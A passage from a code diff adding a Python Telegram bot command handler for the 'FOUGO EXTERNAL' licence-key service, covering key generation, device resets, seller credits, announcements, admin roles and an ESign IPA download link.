+             lines = [f"• [{a['atype']}] *{a['title']}*: {a['message']}" for a in anns] or ["No announcements yet."]
+             send_tg(cid,"📣 *ANNOUNCEMENT SYSTEM*\n" + "\n".join(lines) + "\n\nCreate Announcement:\n`/announce <Type>|<Title>|<Message>`\n_(Types: Global,Update,Maintenance,Important)_",menu_kb())
+            elif data == "menu_notify":
+             send_tg(cid,"🔔 *NOTIFICATION SYSTEM*\nSend notification to users:\n• `/notify all|<Title>|<Message>`\n• `/notify active|<Title>|<Message>`\n• `/notify <KEY>|<Title>|<Message>`",menu_kb())
+            elif data == "menu_logs":
+             logs = db_exec("SELECT * FROM activity_logs ORDER BY id DESC LIMIT 15",fetch=True)
+             lines = [f"• `{l['created_at'][5:16]}` [{l['category']}] *{l['action']}* ({l['actor']}) {l['details']}" for l in logs] or ["No logs recorded yet."]
+             send_tg(cid,"📜 *RECENT ACTIVITY LOGS*\n" + "\n".join(lines) + "\n\nFilter logs: `/logs <category>`",menu_kb())
+            elif data == "menu_admins":
+             adms = db_exec("SELECT * FROM admins",fetch=True)
+             lines = [f"• ID: `{a['telegram_id']}` — Role: *{a['role']}* (`{a['permissions']}`)" for a in adms]
+             send_tg(cid,"👮 *OWNER / ADMIN / SUPPORT ROLES*\n" + "\n".join(lines) + "\n\nCommands:\n• `/addadmin <TG_ID> <OWNER|ADMIN|SUPPORT>`\n• `/deladmin <TG_ID>`",menu_kb())
+            elif data == "menu_settings":
+             send_tg(
+              cid,"⚙️ *OWNER PANEL & BRANDING SETTINGS*\n"
+              f"• Website Name: `{get_setting('website_name')}`\n"
+              f"• Login Title: `{get_setting('login_title')}`\n"
+              f"• Owner Username: `{get_setting('owner_username')}`\n"
+              f"• Allow Owner in Maintenance: `{get_setting('allow_owner_maintenance')}`\n\n"
+              "*Commands:*\n"
+              "• `/setowner <new_username> <new_password>`\n"
+              "• `/setbrand <WebsiteName>|<LoginTitle>|<Subtitle>`\n"
+              "• `/ipa` — Get Direct ESign IPA Link",menu_kb(),)
+            continue
+           msg = u.get("message") or u.get("edited_message") or {}
+           cid = msg.get("chat",{}).get("id")
+           uid = msg.get("from",{}).get("id")
+           txt = (msg.get("text") or "").strip()
+           if not cid or not txt: continue
+           role,perms = get_user_role(uid)
+           parts = txt.split(maxsplit=1)
+           cmd = parts[0].lower().split("@")[0]
+           arg = parts[1].strip() if len(parts) > 1 else ""
+           if b_mode == "USER" and (not role or cmd in ("/start","/help","/ipa") or txt.upper().startswith("FOUGO-")):
+            if txt.upper().startswith("FOUGO-") and not cmd.startswith("/"):
+             cmd, arg = "/key", txt.strip().upper()
+            if cmd in ("/start","/help","/menu"):
+             send_tg(cid,f"👤 *FOUGO EXTERNAL — USER LICENSE PORTAL*\nWelcome! Your Telegram ID: `{uid}`\n\n• Send your `FOUGO-XXXX-XXXX-XXXX` key to check expiration & device status\n• Send `/reset <KEY>` to reset device HWID\n• Send `/ipa` to download the ESign iOS IPA",user_kb)
+             continue
+            elif cmd == "/ipa":
+             send_tg(cid,f"📲 *Direct ESign IPA Download:*\n{ipa_url}",user_kb)
+             continue
+            elif cmd == "/key":
+             rows = db_exec("SELECT * FROM licenses WHERE key=?",(arg.upper(),),fetch=True)
+             if not rows: send_tg(cid,"❌ License Key not found.",user_kb)
+             else:
+              r = rows[0]
+              send_tg(cid,f"🔑 *LICENSE STATUS*\n• *Key:* `{r['key']}`\n• *Status:* `{r['status']}`\n• *Plan:* `{r['duration_days']} Days VIP`\n• *Expires:* `{r['expires_at']}`\n• *Device Limit:* `{r['max_devices']}`",user_kb)
+             continue
+            elif cmd == "/reset":
+             k_up = arg.upper()
+             rows = db_exec("SELECT * FROM licenses WHERE key=?",(k_up,),fetch=True)
+             if not rows: send_tg(cid,"❌ License Key not found.",user_kb)
+             else:
+              db_exec("UPDATE licenses SET session_id='',device_info='' WHERE key=?",(k_up,))
+              db_exec("DELETE FROM sessions WHERE license_key=?",(k_up,))
+              sync_cloud()
+              send_tg(cid,f"✅ Device HWID reset complete for key `{k_up}`!",user_kb)
+             continue
+            elif not role:
+             send_tg(cid,"👤 Send your `FOUGO-XXXX-XXXX-XXXX` key to check status, or tap a button below:",user_kb)
+             continue
+           if not role:
+            send_tg(cid,"⛔ *Access Denied*\nUnauthorized Telegram ID (`" + str(uid) + "`).")
+            log_event(uid,"security","unauthorized_bot_access",txt[:60])
+            continue
+           if cmd in ("/start","/help","/menu","/owner","/admin","/seller"):
+            target_r = "SELLER" if (cmd == "/seller" or b_mode == "SELLER") else ("ADMIN" if cmd == "/admin" and role == "ADMIN" else role)
+            send_tg(cid,stats_txt(uid,target_r),menu_kb(target_r))
+           elif cmd == "/addseller":
+            if role not in ("OWNER","ADMIN"):
+             send_tg(cid,"⛔ Only OWNER or ADMIN can add Sellers.")
+             continue
+            sp = arg.split()
+            if len(sp) >= 1:
+             sid = sp[0].strip()
+             cr = int(sp[1]) if len(sp) >= 2 and sp[1].isdigit() else 50
+             db_exec("INSERT OR REPLACE INTO sellers (telegram_id,username,credits,keys_sold,status,added_at) VALUES (?,?,?,0,'Active',?)",(sid,f"Seller_{sid[-4:]}",cr,now_iso()))
+             log_event(uid,"sellers","add_seller",f"{sid} credits={cr}")
+             send_tg(cid,f"💼 Added Seller `{sid}` with `{cr} Credits`.",menu_kb(role))
+           elif cmd == "/addcredits":
+            if role not in ("OWNER","ADMIN"):
+             send_tg(cid,"⛔ Only OWNER or ADMIN can top up Seller credits.")
+             continue
+            sp = arg.split()
+            if len(sp) >= 2 and sp[1].lstrip("-").isdigit():
+             sid,add_cr = sp[0].strip(),int(sp[1])
+             db_exec("UPDATE sellers SET credits = MAX(0, credits + ?) WHERE telegram_id=?",(add_cr,sid))
+             new_c = get_seller_credits(sid)
+             log_event(uid,"sellers","add_credits",f"{sid} delta={add_cr}")
+             send_tg(cid,f"💳 Updated Seller `{sid}` balance (`{add_cr:+d} Cr`). New Balance: `{new_c} Credits`.",menu_kb(role))
+           elif cmd == "/delseller":
+            if role not in ("OWNER","ADMIN"):
+             send_tg(cid,"⛔ Only OWNER or ADMIN can remove Sellers.")
+             continue
+            sid = arg.strip()
+            db_exec("DELETE FROM sellers WHERE telegram_id=?",(sid,))
+            send_tg(cid,f"🗑 Removed Seller `{sid}`.",menu_kb(role))
+           elif cmd == "/genkey":
+            sp = arg.split()
+            days = int(sp[0]) if len(sp) >= 1 and sp[0].isdigit() else 30
+            qty = int(sp[1]) if len(sp) >= 2 and sp[1].isdigit() else 1
+            qty = min(max(qty,1),100)
+            max_d = int(sp[2]) if len(sp) >= 3 and sp[2].isdigit() else 1
+            note = " ".join(sp[3:]) if len(sp) >= 4 else f"TG-{role}"
+            keys,exp = mk_keys(uid,days,qty,max_d,note)
+            joined = "\n".join(f"`{k}`" for k in keys[:40])
+            send_tg(cid,f"🔑 *Generated {len(keys)} Key(s)* (`{days}d`,MaxDev `{max_d}`):\n\n{joined}",menu_kb())
+           elif cmd == "/search":
+            rows = db_exec("SELECT * FROM licenses WHERE key LIKE ? OR note LIKE ? LIMIT 20",(f"%{arg}%",f"%{arg}%"),fetch=True)
+            lines = [f"• `{r['key']}` — *{r['status']}* | Exp: `{r['expires_at']}` | Dev: `{r['device_info'] or 'None'}`" for r in rows] or ["No matching keys."]
+            send_tg(cid,"🔍 *SEARCH RESULTS:*\n" + "\n".join(lines))
+           elif cmd == "/key":
+            rows = db_exec("SELECT * FROM licenses WHERE key=?",(arg.upper(),),fetch=True)
+            if not rows: send_tg(cid,"❌ Key not found.")
+            else:
+             r = rows[0]
+             send_tg(
+              cid,f"🔑 *LICENSE DETAILS*\n"
+              f"• *Key:* `{r['key']}`\n"
+              f"• *Status:* `{r['status']}`\n"
+              f"• *Duration:* `{r['duration_days']} days`\n"
+              f"• *Max Devices:* `{r['max_devices']}`\n"
+              f"• *Created:* `{r['created_at']}`\n"
+              f"• *Activated:* `{r['activated_at'] or 'Not yet'}`\n"
+              f"• *Expires:* `{r['expires_at']}`\n"
+              f"• *Session/Device:* `{r['session_id']}` / `{r['device_info'] or 'None'}`\n"
+              f"• *Note:* `{r['note']}`"
+             )
+           elif cmd in ("/activate","/suspend","/unsuspend","/revoke","/disable","/enable"):
+            st_map = {
+             "/activate":"Active","/enable":"Active","/unsuspend":"Active","/suspend":"Suspended","/disable":"Disabled","/revoke":"Revoked",}
+            new_st = st_map[cmd]
+            k_up = arg.upper()
+            db_exec("UPDATE licenses SET status=? WHERE key=?",(new_st,k_up))
+            log_event(uid,"keys",f"status_{new_st.lower()}",k_up)
+            send_tg(cid,f"✅ Key `{k_up}` status updated to *{new_st}*.")
+           elif cmd == "/delkey":
+            k_up = arg.upper()
+            db_exec("DELETE FROM licenses WHERE key=?",(k_up,))
+            db_exec("DELETE FROM sessions WHERE license_key=?",(k_up,))
+            log_event(uid,"keys","delete_key",k_up)
+            send_tg(cid,f"🗑 Deleted key `{k_up}` and its sessions.")
+           elif cmd == "/reset":
+            k_up = arg.upper()
+            db_exec("UPDATE licenses SET session_id='',device_info='' WHERE key=?",(k_up,))
+            db_exec("DELETE FROM sessions WHERE license_key=?",(k_up,))
+            log_event(uid,"keys","device_reset",k_up)
+            send_tg(cid,f"🔄 Device & Session reset for key `{k_up}`.")
+           elif cmd == "/extend":
+            sp = arg.split()
+            if len(sp) >= 2 and sp[1].isdigit():
+             k_up,add_d = sp[0].upper(),int(sp[1])
+             new_exp = (datetime.datetime.utcnow() + datetime.timedelta(days=add_d)).strftime("%Y-%m-%d %H:%M:%S UTC")
+             db_exec("UPDATE licenses SET expires_at=?,status='Active' WHERE key=?",(new_exp,k_up))
+             log_event(uid,"keys","extend_expiry",f"{k_up} +{add_d}d")
+             send_tg(cid,f"⏳ Extended `{k_up}` expiry to `{new_exp}`.")
+           elif cmd == "/limit":
+            sp = arg.split()
+            if len(sp) >= 2 and sp[1].isdigit():
+             k_up,lim = sp[0].upper(),int(sp[1])
+             db_exec("UPDATE licenses SET max_devices=? WHERE key=?",(lim,k_up))
+             log_event(uid,"keys","change_limit",f"{k_up} max={lim}")
+             send_tg(cid,f"📱 Updated `{k_up}` device limit to `{lim}`.")
+           elif cmd == "/addchannel":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 2:
+             btn_t = sp[2] if len(sp) >= 3 else "JOIN CHANNEL"
+             db_exec("INSERT INTO channels (title,url,button_text,enabled,display_order) VALUES (?,?,?,1,1)",(sp[0],sp[1],btn_t))
+             log_event(uid,"channels","add_channel",sp[0])
+             send_tg(cid,f"📢 Added channel *{sp[0]}* (`{sp[1]}`).")
+           elif cmd == "/delchannel":
+            db_exec("DELETE FROM channels WHERE id=?",(arg,))
+            log_event(uid,"channels","del_channel",arg)
+            send_tg(cid,f"🗑 Deleted channel ID `{arg}`.")
+           elif cmd == "/addfeature":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 3:
+             btn_t = sp[3] if len(sp) >= 4 else "ACTIVATE"
+             db_exec("INSERT OR REPLACE INTO features (code,title,description,button_text,visible,locked,enabled,display_order) VALUES (?,?,?,?,1,0,1,1)",(sp[0].upper(),sp[1],sp[2],btn_t))
+             log_event(uid,"features","add_feature",sp[0].upper())
+             send_tg(cid,f"🎛 Added/Updated feature *{sp[1]}* (`{sp[0].upper()}`).")
+           elif cmd == "/delfeature":
+            db_exec("DELETE FROM features WHERE code=?",(arg.upper(),))
+            log_event(uid,"features","del_feature",arg.upper())
+            send_tg(cid,f"🗑 Deleted feature `{arg.upper()}`.")
+           elif cmd == "/addprofile":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 4:
+             btn_t = sp[4] if len(sp) >= 5 else "INSTALL PROFILE"
+             db_exec("INSERT OR REPLACE INTO profiles (name,display_name,description,version,install_url,download_url,button_text,status,is_default,display_order,updated_at) VALUES (?,?,?,?,?,?,?,'Active',0,1,?)",(sp[0],sp[1],sp[1],sp[2],sp[3],sp[3],btn_t,now_iso()))
+             log_event(uid,"profiles","add_profile",sp[0])
+             send_tg(cid,f"📲 Added Configuration Profile *{sp[1]}* (`v{sp[2]}`).")
+           elif cmd == "/setmaint":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 2:
+             set_setting("maintenance_title",sp[0])
+             set_setting("maintenance_description",sp[1])
+             if len(sp) >= 3: set_setting("maintenance_return_time",sp[2])
+             log_event(uid,"maintenance","update_content",sp[0])
+             send_tg(cid,"✅ Maintenance page content updated.")
+           elif cmd == "/announce":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 3:
+             db_exec("INSERT INTO announcements (atype,title,message,enabled,start_time,end_time) VALUES (?,?,?,1,?,?)",(sp[0],sp[1],sp[2],now_iso(),""))
+             log_event(uid,"announcements","create",sp[1])
+             send_tg(cid,f"📣 Published *{sp[0]}* announcement: *{sp[1]}*")
+           elif cmd == "/notify":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 3:
+             db_exec("INSERT INTO notifications (target_type,target_val,title,message,ntype,created_at,read_state) VALUES (?,?,?,?,'info',?,0)",(sp[0],sp[0],sp[1],sp[2],now_iso()))
+             log_event(uid,"notifications","send",f"Target={sp[0]} Title={sp[1]}")
+             send_tg(cid,f"🔔 Notification dispatched to `{sp[0]}`: *{sp[1]}*")
+           elif cmd == "/logs":
+            q = f"%{arg}%" if arg else "%"
+            rows = db_exec("SELECT * FROM activity_logs WHERE category LIKE ? OR action LIKE ? ORDER BY id DESC LIMIT 20",(q,q),fetch=True)
+            lines = [f"• `{r['created_at'][5:16]}` [{r['category']}] *{r['action']}*: `{r['details']}`" for r in rows] or ["No matching logs."]
+            send_tg(cid,"📜 *ACTIVITY LOGS*\n" + "\n".join(lines))
+           elif cmd == "/addadmin":
+            if role != "OWNER":
+             send_tg(cid,"⛔ Only OWNER can manage admins.")
+             continue
+            sp = arg.split()
+            if len(sp) >= 2:
+             tid,rl = sp[0],sp[1].upper()
+             db_exec("INSERT OR REPLACE INTO admins (telegram_id,role,permissions,added_at) VALUES (?,?,?,?)",(tid,rl,"all" if rl == "OWNER" else "default",now_iso()))
+             log_event(uid,"admins","add_admin",f"{tid} as {rl}")
+             send_tg(cid,f"👮 Added Telegram ID `{tid}` with role *{rl}*.")
+           elif cmd == "/deladmin":
+            if role != "OWNER":
+             send_tg(cid,"⛔ Only OWNER can remove admins.")
+             continue
+            db_exec("DELETE FROM admins WHERE telegram_id=?",(arg.strip(),))
+            send_tg(cid,f"🗑 Removed admin `{arg.strip()}`.")
+           elif cmd == "/setowner":
+            if role != "OWNER":
+             send_tg(cid,"⛔ Only OWNER can change Owner Panel credentials.")
+             continue
+            sp = arg.split()
+            if len(sp) >= 2:
+             set_setting("owner_username",sp[0])
+             set_setting("owner_password_hash",hash_pw(sp[1]))
+             log_event(uid,"owner","change_credentials",sp[0])
+             send_tg(cid,f"🔐 Updated `/owner` login username to `{sp[0]}` and hashed new password.")
+           elif cmd == "/setbrand":
+            sp = [x.strip() for x in arg.split("|")]
+            if len(sp) >= 2:
+             set_setting("website_name",sp[0])
+             set_setting("login_title",sp[1])
+             if len(sp) >= 3: set_setting("subtitle",sp[2])
+             log_event(uid,"branding","update",sp[0])
+             send_tg(cid,"✅ Updated Branding Settings.")
+           elif cmd == "/ipa":
+            send_tg(cid,f"📲 *Direct ESign IPA Download:*\n{ipa_url}")
+           elif cmd == "/status":
+            send_tg(cid,stats_txt(),menu_kb())
+         except Exception:
+          time.sleep(3)
+        EOF
